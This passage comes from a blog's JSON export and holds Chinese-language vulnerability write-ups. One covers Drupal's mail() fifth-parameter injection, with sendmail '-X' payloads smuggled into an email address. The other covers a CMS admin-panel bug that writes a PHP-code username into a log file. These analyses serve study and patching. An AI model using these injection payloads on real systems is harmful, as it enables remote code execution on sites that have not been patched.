escapeshellarg：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/01dc7a5e7ed3c9bc4f7a8c0486fe8cda.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/dab5c99f9daed0ec46790c6a479f7349.png)\n\n但是这次的drupal是怎么做的呢？是否也可以绕过呢？\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/07cdf77d32073ede6c4a825705ce3fc0.png)\n\n首先看第一个if分支\n\n可以看出，只要escapeshellcmd处理后和原string不一样，或者escapeshellarg处理后不是'$string', \"$string\"这两个样子的，直接return **false****，**之前的PHPMail是过滤后拿来用，而这里是发现string中有_&amp;#;`|*?~&lt;&gt;^()[]{}$\\_, _\\x0A_ 和 _\\xFF__，或是里面string有单引号双引号，直接return false，一点构造payload的机会都不给。_\n\n_ _\n\n再看第二个if\n\n可以看出这是一个正则表达式，除了email中可以使用的a-zA-Z0-9@_\\-.这些字符，其他的出现则return false，实在是难以利用。\n\n## 总结\n\n*   漏洞原理比较的简单，和之前的那些mail第五个参数注入漏洞完全一样。\n*   补丁比较有效，和之前那些出过问题的应用处理手法完全不一样。","source":"_posts/drupal-mail.md","raw":"---\ntitle: Drupal Core SA-CORE-2018-006 mail() 函数代码注入漏洞分析\ndate: 2018-10-29 15:41:11\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日，Drupal官方发布安全通告修复了多个安全性问题，其中包括2个严重的远程代码执行漏洞，影响Drupal 7和8的多个版本。其中一个漏洞源于在发送emai时，一些变量没有进行适当的处理就传给了shell执行，因此可能导致远程代码执行。\n\n<!--more-->\n\n漏洞预警可以参考这里\n> [http://blog.nsfocus.net/drupal/](http://blog.nsfocus.net/drupal/)\n> &nbsp;\n\n## 漏洞Mail方法\n\n本次漏洞出现在PhpMail.php中\n\n下面看下存在漏洞的mail方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/7b3ec22d68ca3f737740cfbde1e6e74d.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/e6c094a322e293af6b7286802a09d627.png)\n\n&nbsp;\n\n接下来可以看下drupal在8.6.2版本中修补的代码，如下两张图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/de76deb7a29b39a4ab95e25ec4a38217.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/a1b281f3aed8cf59026a14442a04b465.png)\n\n&nbsp;\n\n通过这个补丁可以看出，8.6.2版的drupal对$message['Return-Path']值进行了验证，通过后拼接”-f”赋值与$additional_headers。\n\n## PHP中的mail方法\n\n下面看下php中的mail方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/01afad47e39f44b21cfccb74fc0fd63a.png)\n\nMail方法接收五个参数，这里我们重点关注第五个参数 $additional_parameters\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/5dc80b4f40894e4d8d691929e69a8114.png)\n\n从参数说明可以看出，这个$additional_parameters参数通常是用于将其他参数传递来设置发送邮件时的一些属性，比如使用的-f参数，用来配置封发件人地址\n\n&nbsp;\n\n比如说如下例子\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/c6d1790a12a88536d3b6c17c296a28fd.png)\n\nDrupal中的作用也是如此的，如下图8.6.1版本的存在漏洞的drupal代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/8e47c743abe46e0c2dee73dfa002e2b2.png)\n\n判断是否存在$message[‘Return-Path’],如果有，就拼接”-f”作为mail的$additional_parameters参数进行使用。\n\n&nbsp;\n\n**mail**函数第五个参数漏洞。看到这里，有没有想起来之前16年的PHPMailer漏洞？当时我也曾对这个漏洞进行过分析，链接如下：\n\nhttp://blog.nsfocus.net/phpmailer-vulnerability-analysis/\n\n&nbsp;\n\n漏洞原理极其相似，甚至在利用上都是一样的\n\n## 漏洞利用方法\n\n简单的介绍下一种利用方法：\n\n在传递$additional_parameters参数时，由于没有进行有效的过滤，我们可以在后面构造出 -X参数，这个参数的作用是指定写入log的文件路径，然后就可以将可执行的代码通过邮件正文写入我们制定位置的日志文件中去。Payload类似这样的\n<pre class=\"lang:default decode:true\">xxx( -X/var/www/test.php )@qq.com</pre>\n&nbsp;\n\n最终的$additional_parameters参数类似这样的：\n<pre class=\"lang:default decode:true\">-fxxx( -X/var/www/success.php )@qq.com</pre>\n&nbsp;\n\n然而呢？\n\nPHPMailer 小于 5.2.18 版本的 RCE 漏洞，官方在补丁中使用了escapeshellarg来防止注入参数，但是当时这个补丁是可以被**绕过**的。\n\n看下当时PHPMailer怎么补的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/d18fe8585c9dc5b41e7706f6be101bde.png)\n\nPHPMailer的补丁中，对传入的参数使用escapeshellarg进行过滤，但是php中mail方法自身用使用了escapeshellcmd进行处理，最终用这两个方法配合，反而弄巧成拙，造成绕过，具体的可以参考当时的那个漏洞，很有意思，这里不细说了,具体的可以看下那个漏洞。\n\n&nbsp;\n\n温故下escapeshellarg和escapeshellcmd用法：\n\n&nbsp;\n\n### escapeshellcmd：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/7fadb4b66067265bd5be80a393fd6069.png)\n\n### escapeshellarg：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/01dc7a5e7ed3c9bc4f7a8c0486fe8cda.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/dab5c99f9daed0ec46790c6a479f7349.png)\n\n但是这次的drupal是怎么做的呢？是否也可以绕过呢？\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/10/07cdf77d32073ede6c4a825705ce3fc0.png)\n\n首先看第一个if分支\n\n可以看出，只要escapeshellcmd处理后和原string不一样，或者escapeshellarg处理后不是'$string', \"$string\"这两个样子的，直接return **false****，**之前的PHPMail是过滤后拿来用，而这里是发现string中有_&amp;#;`|*?~&lt;&gt;^()[]{}$\\_, _\\x0A_ 和 _\\xFF__，或是里面string有单引号双引号，直接return false，一点构造payload的机会都不给。_\n\n_ _\n\n再看第二个if\n\n可以看出这是一个正则表达式，除了email中可以使用的a-zA-Z0-9@_\\-.这些字符，其他的出现则return false，实在是难以利用。\n\n## 总结\n\n*   漏洞原理比较的简单，和之前的那些mail第五个参数注入漏洞完全一样。\n*   补丁比较有效，和之前那些出过问题的应用处理手法完全不一样。","slug":"drupal-mail","published":1,"updated":"2020-10-27T09:27:09.726Z","_id":"ckgrozu990033wsa9gqdi0fsh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日，Drupal官方发布安全通告修复了多个安全性问题，其中包括2个严重的远程代码执行漏洞，影响Drupal 7和8的多个版本。其中一个漏洞源于在发送emai时，一些变量没有进行适当的处理就传给了shell执行，因此可能导致远程代码执行。</p>\n<a id=\"more\"></a>\n\n<p>漏洞预警可以参考这里</p>\n<blockquote>\n<p><a href=\"http://blog.nsfocus.net/drupal/\">http://blog.nsfocus.net/drupal/</a><br>&nbsp;</p>\n</blockquote>\n<h2 id=\"漏洞Mail方法\"><a href=\"#漏洞Mail方法\" class=\"headerlink\" title=\"漏洞Mail方法\"></a>漏洞Mail方法</h2><p>本次漏洞出现在PhpMail.php中</p>\n<p>下面看下存在漏洞的mail方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/7b3ec22d68ca3f737740cfbde1e6e74d.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/e6c094a322e293af6b7286802a09d627.png\"></p>\n<p>&nbsp;</p>\n<p>接下来可以看下drupal在8.6.2版本中修补的代码，如下两张图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/de76deb7a29b39a4ab95e25ec4a38217.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/a1b281f3aed8cf59026a14442a04b465.png\"></p>\n<p>&nbsp;</p>\n<p>通过这个补丁可以看出，8.6.2版的drupal对$message[‘Return-Path’]值进行了验证，通过后拼接”-f”赋值与$additional_headers。</p>\n<h2 id=\"PHP中的mail方法\"><a href=\"#PHP中的mail方法\" class=\"headerlink\" title=\"PHP中的mail方法\"></a>PHP中的mail方法</h2><p>下面看下php中的mail方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/01afad47e39f44b21cfccb74fc0fd63a.png\"></p>\n<p>Mail方法接收五个参数，这里我们重点关注第五个参数 $additional_parameters</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/5dc80b4f40894e4d8d691929e69a8114.png\"></p>\n<p>从参数说明可以看出，这个$additional_parameters参数通常是用于将其他参数传递来设置发送邮件时的一些属性，比如使用的-f参数，用来配置封发件人地址</p>\n<p>&nbsp;</p>\n<p>比如说如下例子</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/c6d1790a12a88536d3b6c17c296a28fd.png\"></p>\n<p>Drupal中的作用也是如此的，如下图8.6.1版本的存在漏洞的drupal代码：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/8e47c743abe46e0c2dee73dfa002e2b2.png\"></p>\n<p>判断是否存在$message[‘Return-Path’],如果有，就拼接”-f”作为mail的$additional_parameters参数进行使用。</p>\n<p>&nbsp;</p>\n<p><strong>mail</strong>函数第五个参数漏洞。看到这里，有没有想起来之前16年的PHPMailer漏洞？当时我也曾对这个漏洞进行过分析，链接如下：</p>\n<p><a href=\"http://blog.nsfocus.net/phpmailer-vulnerability-analysis/\">http://blog.nsfocus.net/phpmailer-vulnerability-analysis/</a></p>\n<p>&nbsp;</p>\n<p>漏洞原理极其相似，甚至在利用上都是一样的</p>\n<h2 id=\"漏洞利用方法\"><a href=\"#漏洞利用方法\" class=\"headerlink\" title=\"漏洞利用方法\"></a>漏洞利用方法</h2><p>简单的介绍下一种利用方法：</p>\n<p>在传递$additional_parameters参数时，由于没有进行有效的过滤，我们可以在后面构造出 -X参数，这个参数的作用是指定写入log的文件路径，然后就可以将可执行的代码通过邮件正文写入我们制定位置的日志文件中去。Payload类似这样的</p>\n<pre class=\"lang:default decode:true\">xxx( -X/var/www/test.php )@qq.com</pre>\n<p>&nbsp;</p>\n<p>最终的$additional_parameters参数类似这样的：</p>\n<pre class=\"lang:default decode:true\">-fxxx( -X/var/www/success.php )@qq.com</pre>\n<p>&nbsp;</p>\n<p>然而呢？</p>\n<p>PHPMailer 小于 5.2.18 版本的 RCE 漏洞，官方在补丁中使用了escapeshellarg来防止注入参数，但是当时这个补丁是可以被<strong>绕过</strong>的。</p>\n<p>看下当时PHPMailer怎么补的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/d18fe8585c9dc5b41e7706f6be101bde.png\"></p>\n<p>PHPMailer的补丁中，对传入的参数使用escapeshellarg进行过滤，但是php中mail方法自身用使用了escapeshellcmd进行处理，最终用这两个方法配合，反而弄巧成拙，造成绕过，具体的可以参考当时的那个漏洞，很有意思，这里不细说了,具体的可以看下那个漏洞。</p>\n<p>&nbsp;</p>\n<p>温故下escapeshellarg和escapeshellcmd用法：</p>\n<p>&nbsp;</p>\n<h3 id=\"escapeshellcmd：\"><a href=\"#escapeshellcmd：\" class=\"headerlink\" title=\"escapeshellcmd：\"></a>escapeshellcmd：</h3><p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/7fadb4b66067265bd5be80a393fd6069.png\"></p>\n<h3 id=\"escapeshellarg：\"><a href=\"#escapeshellarg：\" class=\"headerlink\" title=\"escapeshellarg：\"></a>escapeshellarg：</h3><p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/01dc7a5e7ed3c9bc4f7a8c0486fe8cda.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/dab5c99f9daed0ec46790c6a479f7349.png\"></p>\n<p>但是这次的drupal是怎么做的呢？是否也可以绕过呢？</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/07cdf77d32073ede6c4a825705ce3fc0.png\"></p>\n<p>首先看第一个if分支</p>\n<p>可以看出，只要escapeshellcmd处理后和原string不一样，或者escapeshellarg处理后不是’$string’, “$string”这两个样子的，直接return <strong>false**</strong>，*<em>之前的PHPMail是过滤后拿来用，而这里是发现string中有_&amp;#;`|</em>?~&lt;&gt;^()[]{}$_, <em>\\x0A</em> 和 <em>\\xFF__，或是里面string有单引号双引号，直接return false，一点构造payload的机会都不给。</em></p>\n<p>_ _</p>\n<p>再看第二个if</p>\n<p>可以看出这是一个正则表达式，除了email中可以使用的a-zA-Z0-9@_-.这些字符，其他的出现则return false，实在是难以利用。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>漏洞原理比较的简单，和之前的那些mail第五个参数注入漏洞完全一样。</li>\n<li>补丁比较有效，和之前那些出过问题的应用处理手法完全不一样。</li>\n</ul>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/如何平衡软件安全领域中的安全开发与安全运营.jpg","excerpt":"<p>近日，Drupal官方发布安全通告修复了多个安全性问题，其中包括2个严重的远程代码执行漏洞，影响Drupal 7和8的多个版本。其中一个漏洞源于在发送emai时，一些变量没有进行适当的处理就传给了shell执行，因此可能导致远程代码执行。</p>","more":"<p>漏洞预警可以参考这里</p>\n<blockquote>\n<p><a href=\"http://blog.nsfocus.net/drupal/\">http://blog.nsfocus.net/drupal/</a><br>&nbsp;</p>\n</blockquote>\n<h2 id=\"漏洞Mail方法\"><a href=\"#漏洞Mail方法\" class=\"headerlink\" title=\"漏洞Mail方法\"></a>漏洞Mail方法</h2><p>本次漏洞出现在PhpMail.php中</p>\n<p>下面看下存在漏洞的mail方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/7b3ec22d68ca3f737740cfbde1e6e74d.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/e6c094a322e293af6b7286802a09d627.png\"></p>\n<p>&nbsp;</p>\n<p>接下来可以看下drupal在8.6.2版本中修补的代码，如下两张图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/de76deb7a29b39a4ab95e25ec4a38217.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/a1b281f3aed8cf59026a14442a04b465.png\"></p>\n<p>&nbsp;</p>\n<p>通过这个补丁可以看出，8.6.2版的drupal对$message[‘Return-Path’]值进行了验证，通过后拼接”-f”赋值与$additional_headers。</p>\n<h2 id=\"PHP中的mail方法\"><a href=\"#PHP中的mail方法\" class=\"headerlink\" title=\"PHP中的mail方法\"></a>PHP中的mail方法</h2><p>下面看下php中的mail方法：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/01afad47e39f44b21cfccb74fc0fd63a.png\"></p>\n<p>Mail方法接收五个参数，这里我们重点关注第五个参数 $additional_parameters</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/5dc80b4f40894e4d8d691929e69a8114.png\"></p>\n<p>从参数说明可以看出，这个$additional_parameters参数通常是用于将其他参数传递来设置发送邮件时的一些属性，比如使用的-f参数，用来配置封发件人地址</p>\n<p>&nbsp;</p>\n<p>比如说如下例子</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/c6d1790a12a88536d3b6c17c296a28fd.png\"></p>\n<p>Drupal中的作用也是如此的，如下图8.6.1版本的存在漏洞的drupal代码：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/8e47c743abe46e0c2dee73dfa002e2b2.png\"></p>\n<p>判断是否存在$message[‘Return-Path’],如果有，就拼接”-f”作为mail的$additional_parameters参数进行使用。</p>\n<p>&nbsp;</p>\n<p><strong>mail</strong>函数第五个参数漏洞。看到这里，有没有想起来之前16年的PHPMailer漏洞？当时我也曾对这个漏洞进行过分析，链接如下：</p>\n<p><a href=\"http://blog.nsfocus.net/phpmailer-vulnerability-analysis/\">http://blog.nsfocus.net/phpmailer-vulnerability-analysis/</a></p>\n<p>&nbsp;</p>\n<p>漏洞原理极其相似，甚至在利用上都是一样的</p>\n<h2 id=\"漏洞利用方法\"><a href=\"#漏洞利用方法\" class=\"headerlink\" title=\"漏洞利用方法\"></a>漏洞利用方法</h2><p>简单的介绍下一种利用方法：</p>\n<p>在传递$additional_parameters参数时，由于没有进行有效的过滤，我们可以在后面构造出 -X参数，这个参数的作用是指定写入log的文件路径，然后就可以将可执行的代码通过邮件正文写入我们制定位置的日志文件中去。Payload类似这样的</p>\n<pre class=\"lang:default decode:true\">xxx( -X/var/www/test.php )@qq.com</pre>\n<p>&nbsp;</p>\n<p>最终的$additional_parameters参数类似这样的：</p>\n<pre class=\"lang:default decode:true\">-fxxx( -X/var/www/success.php )@qq.com</pre>\n<p>&nbsp;</p>\n<p>然而呢？</p>\n<p>PHPMailer 小于 5.2.18 版本的 RCE 漏洞，官方在补丁中使用了escapeshellarg来防止注入参数，但是当时这个补丁是可以被<strong>绕过</strong>的。</p>\n<p>看下当时PHPMailer怎么补的</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/d18fe8585c9dc5b41e7706f6be101bde.png\"></p>\n<p>PHPMailer的补丁中，对传入的参数使用escapeshellarg进行过滤，但是php中mail方法自身用使用了escapeshellcmd进行处理，最终用这两个方法配合，反而弄巧成拙，造成绕过，具体的可以参考当时的那个漏洞，很有意思，这里不细说了,具体的可以看下那个漏洞。</p>\n<p>&nbsp;</p>\n<p>温故下escapeshellarg和escapeshellcmd用法：</p>\n<p>&nbsp;</p>\n<h3 id=\"escapeshellcmd：\"><a href=\"#escapeshellcmd：\" class=\"headerlink\" title=\"escapeshellcmd：\"></a>escapeshellcmd：</h3><p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/7fadb4b66067265bd5be80a393fd6069.png\"></p>\n<h3 id=\"escapeshellarg：\"><a href=\"#escapeshellarg：\" class=\"headerlink\" title=\"escapeshellarg：\"></a>escapeshellarg：</h3><p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/01dc7a5e7ed3c9bc4f7a8c0486fe8cda.png\"></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/dab5c99f9daed0ec46790c6a479f7349.png\"></p>\n<p>但是这次的drupal是怎么做的呢？是否也可以绕过呢？</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/10/07cdf77d32073ede6c4a825705ce3fc0.png\"></p>\n<p>首先看第一个if分支</p>\n<p>可以看出，只要escapeshellcmd处理后和原string不一样，或者escapeshellarg处理后不是’$string’, “$string”这两个样子的，直接return <strong>false**</strong>，*<em>之前的PHPMail是过滤后拿来用，而这里是发现string中有_&amp;#;`|</em>?~&lt;&gt;^()[]{}$_, <em>\\x0A</em> 和 <em>\\xFF__，或是里面string有单引号双引号，直接return false，一点构造payload的机会都不给。</em></p>\n<p>_ _</p>\n<p>再看第二个if</p>\n<p>可以看出这是一个正则表达式，除了email中可以使用的a-zA-Z0-9@_-.这些字符，其他的出现则return false，实在是难以利用。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>漏洞原理比较的简单，和之前的那些mail第五个参数注入漏洞完全一样。</li>\n<li>补丁比较有效，和之前那些出过问题的应用处理手法完全不一样。</li>\n</ul>"},{"title":"某CMS后台远程代码执行漏洞","date":"2019-12-27T09:31:13.000Z","categorise":"技术","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n在审计某CMS代码时，发现后台存在一处比较有意思的远程代码执行漏洞，这里跟大家分享下\n\n<!--more-->\n\n漏洞分析\n--------\n\n漏洞触发点位于下图代码段中\n\n![18198d7bef3600f760c2119c30c64ecc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162647-768caf50-2302-1.png)\n\n见上图803行处，存在一处fwrite方法：\n\n程序会将修改日志$log变量中的值保存到'/integrate_' . $_SESSION['code'] .'_log.php'文件中\n\n接下来看一下$log变量是如何拼接的：\n\n$log变量是由如下一个或多个变量控制:$del_list、$rename_list以及$ignore_list\n\n当这个三个变量存在时，则将其值拼接到$log变量中\n\n这里着重看一下$ignore_list变量，分析代码可以发现，$ignore_list变量由下述代码中赋值得来\n\n![7683d7c5d4d1ca08b5e70174a93087fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162655-7ba47e28-2302-1.png)\n\n由上图代码可见$ignore_list变量由数据库中users表user_name数据组成。其实$ignore_list就是users表中flag等于4的所有user_name字段组成的列表\n\n![1b91284972c1113a79c2bf1fd70956e0.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162703-804630b6-2302-1.png)\n\n见上图，当请求中act参数值为sync时，并且当users表中存在flag=4的行时，触发此处$ignore_list赋值操作，将users表中flag等于4的所有行的user_name字段值插入$ignore_list列表\n\n当$ignore_list列表非空时，触发同样在此if分支(请求中act参数值为sync的这个分支)中的漏洞点\n\n![0f0f4dc686ff9a92c9ba427a796015d6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162714-86f223fc-2302-1.png)\n\n上图红框处，$ignore_list列表中的用户名被取出，用来拼接$log变量，随后$log变量被写入'/integrate_'. $_SESSION['code'] . '_log.php'文件中\n\n程序并未对会员用户名进行严格过滤，导致可以写入含有payload的用户名，例如\n\n![15d30f7d208c53a7ca582868cd4f5a9f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162724-8cce1ea2-2302-1.png)\n\n当我们将含有恶意payload用户名的用户flag设置为4时，通过访问\n\nhttp://127.0.0.1/admin/integrate.php?act=sync\n\n即可将含有payload用户名写入'/integrate_' . $_SESSION['code'] . '_log.php'文件中\n\n接下来分析下被插入payload文件的位置与名字\n\n![f05035aa16c4c659585e1e1a4602a72c.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162735-936c3988-2302-1.png)\n\n可见上图，这个文件位置很好定位，位于ROOT_PATH . DATA_DIR路径，即为data文件夹中。\n\n关于文件名，中间存在一个$_SESSION['code']变量，此处变量是可以设置的，但是如果我们不进行特殊设置的化，这个变量默认是空，因此我们并不需要额外的设置这个变量，默认让它为空就可以了，这样以来被插入后门的文件就变成\n\ndata/integrate__log.php\n\n接下来分析下，如何使users中我们构造的恶意用户flag为4\n\n默认情况下，会员用户flag为0，当会员整合功能被使用时，其他应用商城的会员被整合合并到这个cms时，当存在一些问题需要忽略这个用户时，flag才会被设置为4\n\n如果使用这种方法，则需要攻击者自行搭建一个此cms允许合并数据的商城程序，在这个商城程序中构造一个会员，当使用会员合并功能时，使之出现问题，从而使得被合并的会员flag为4\n\n利用会员整合功能修改flag值是一种途径，然而有一种更简便的方法。此cms程序后台存在可以管理数据库的功能，我们可以通过这个功能直接把用户名为”<?php phpinfo(); /*”的这条数据中flag字段设置为”4”，见下图\n\n![57a266774442cac19e1940f78a19be59.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162744-9867b278-2302-1.png)\n\n这样一来，当访问\n\n<http://127.0.0.1/admin/integrate.php?act=sync>\n\n时，该数据将会被取出，含有payload的用户名将会被写入日志文件中\n\n![ed203b9ab0d60983b3d416c61895714d.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162751-9ca610be-2302-1.png)\n\n![a87d9a0b26820ed3f67e5344a693c9f0.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162817-ac3dea1a-2302-1.png)\n\n文件被访问时，payload执行\n\n![d2a929fbdeef3fa6abb0ec4db4d46af1.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162828-b2ec022a-2302-1.png)","source":"_posts/ecshop.md","raw":"---\ntitle: 某CMS后台远程代码执行漏洞\ndate: 2019-12-27 17:31:13\ntags: web漏洞分析\ncategorise: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n在审计某CMS代码时，发现后台存在一处比较有意思的远程代码执行漏洞，这里跟大家分享下\n\n<!--more-->\n\n漏洞分析\n--------\n\n漏洞触发点位于下图代码段中\n\n![18198d7bef3600f760c2119c30c64ecc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162647-768caf50-2302-1.png)\n\n见上图803行处，存在一处fwrite方法：\n\n程序会将修改日志$log变量中的值保存到'/integrate_' . $_SESSION['code'] .'_log.php'文件中\n\n接下来看一下$log变量是如何拼接的：\n\n$log变量是由如下一个或多个变量控制:$del_list、$rename_list以及$ignore_list\n\n当这个三个变量存在时，则将其值拼接到$log变量中\n\n这里着重看一下$ignore_list变量，分析代码可以发现，$ignore_list变量由下述代码中赋值得来\n\n![7683d7c5d4d1ca08b5e70174a93087fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162655-7ba47e28-2302-1.png)\n\n由上图代码可见$ignore_list变量由数据库中users表user_name数据组成。其实$ignore_list就是users表中flag等于4的所有user_name字段组成的列表\n\n![1b91284972c1113a79c2bf1fd70956e0.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162703-804630b6-2302-1.png)\n\n见上图，当请求中act参数值为sync时，并且当users表中存在flag=4的行时，触发此处$ignore_list赋值操作，将users表中flag等于4的所有行的user_name字段值插入$ignore_list列表\n\n当$ignore_list列表非空时，触发同样在此if分支(请求中act参数值为sync的这个分支)中的漏洞点\n\n![0f0f4dc686ff9a92c9ba427a796015d6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162714-86f223fc-2302-1.png)\n\n上图红框处，$ignore_list列表中的用户名被取出，用来拼接$log变量，随后$log变量被写入'/integrate_'. $_SESSION['code'] . '_log.php'文件中\n\n程序并未对会员用户名进行严格过滤，导致可以写入含有payload的用户名，例如\n\n![15d30f7d208c53a7ca582868cd4f5a9f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162724-8cce1ea2-2302-1.png)\n\n当我们将含有恶意payload用户名的用户flag设置为4时，通过访问\n\nhttp://127.0.0.1/admin/integrate.php?act=sync\n\n即可将含有payload用户名写入'/integrate_' . $_SESSION['code'] . '_log.php'文件中\n\n接下来分析下被插入payload文件的位置与名字\n\n![f05035aa16c4c659585e1e1a4602a72c.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162735-936c3988-2302-1.png)\n\n可见上图，这个文件位置很好定位，位于ROOT_PATH . DATA_DIR路径，即为data文件夹中。\n\n关于文件名，中间存在一个$_SESSION['code']变量，此处变量是可以设置的，但是如果我们不进行特殊设置的化，这个变量默认是空，因此我们并不需要额外的设置这个变量，默认让它为空就可以了，这样以来被插入后门的文件就变成\n\ndata/integrate__log.php\n\n接下来分析下，如何使users中我们构造的恶意用户flag为4\n\n默认情况下，会员用户flag为0，当会员整合功能被使用时，其他应用商城的会员被整合合并到这个cms时，当存在一些问题需要忽略这个用户时，flag才会被设置为4\n\n如果使用这种方法，则需要攻击者自行搭建一个此cms允许合并数据的商城程序，在这个商城程序中构造一个会员，当使用会员合并功能时，使之出现问题，从而使得被合并的会员flag为4\n\n利用会员整合功能修改flag值是一种途径，然而有一种更简便的方法。此cms程序后台存在可以管理数据库的功能，我们可以通过这个功能直接把用户名为”<?php phpinfo(); 